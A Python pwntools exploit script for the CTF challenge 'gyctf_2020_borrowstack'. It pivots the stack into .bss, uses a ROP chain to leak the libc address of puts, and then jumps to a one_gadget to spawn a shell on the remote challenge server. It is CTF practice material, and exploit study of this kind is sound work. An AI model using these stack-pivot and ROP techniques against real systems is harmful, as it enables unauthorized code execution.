#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'gyctf_2020_borrowstack')
libc = ELF('libc-2.23.so')
ld = ELF('/lib64/ld-linux-x86-64.so.2')
host = args.HOST or 'node5.buuoj.cn'
port = int(args.PORT or 27495)


def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([ld.path, exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *main+116
continue
'''.format(**locals())

leave_ret = 0x0000000000400699
ret = 0x00000000004004c9
pop_rdi = 0x0000000000400703
read = 0x400680
_bss = 0x601080

io = start()
p = b'a' * 96
p += p64(_bss)
p += p64(leave_ret)
io.sendafter(b'want\n', p)

p = p64(ret) * 20
p += p64(pop_rdi)
p += p64(exe.got.puts)
p += p64(exe.sym.puts)
p += p64(exe.sym.main)

io.sendafter(b'now!\n', p)
leak = u64(io.recvuntil(b'\x7f').ljust(8, b'\x00'))
libc.address = leak - libc.sym.puts
print('[leak]', hex(leak))
print('[libc]', hex(libc.address))

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
io.clean()
p = b'A' * 96
p += b'B' * 8
p += p64(libc.address + one_gadgets[1])
io.send(p)
io.interactive()


